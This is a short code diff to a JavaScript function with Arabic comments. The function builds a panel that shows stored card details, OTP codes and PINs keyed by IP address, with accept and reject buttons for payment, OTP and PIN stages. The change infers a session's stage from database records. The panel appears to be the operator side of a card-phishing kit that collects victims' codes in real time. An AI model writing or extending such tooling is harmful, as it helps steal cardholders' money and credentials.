@@ -585,7 +585,16 @@ function buildCardSection(ip, ex){
   // كل OTP من DB مرتبة من الأحدث للأقدم
   const allOtps=od?[od,...hc.filter(c=>c.code_type!=='pin')]:[...hc.filter(c=>c.code_type!=='pin')];
   const allPins=pind?[pind,...hc.filter(c=>c.code_type==='pin')]:[...hc.filter(c=>c.code_type==='pin')];
-  const stage=ls[ldKey]||ls[nip];
+  // تحديد stage من live أو من DB
+  let stage=ls[ldKey]||ls[nip];
+  if(!stage){
+    // استنتاج stage من بيانات DB
+    const dbPins=hc.filter(c=>c.code_type==='pin');
+    const dbOtps=hc.filter(c=>c.code_type==='otp');
+    if(dbPins.length>0 && dbPins[0].request_id) stage='pin';
+    else if(dbOtps.length>0 && dbOtps[0].request_id) stage='otp';
+    else if(hp.length>0 && hp[0].request_id) stage='payment';
+  }
 
   let h=`
   <!-- بيانات البطاقة -->
@@ -685,7 +694,7 @@ function buildCardSection(ip, ex){
       الإجراءات
     </div>`;
 
-  if(stage&&ld[ldKey]){
+  if(stage){
     const lbl={
       payment:{a:'قبول / التالي',r:'رفض'},
       otp:{a:'قبول / التالي',r:'رفض'},
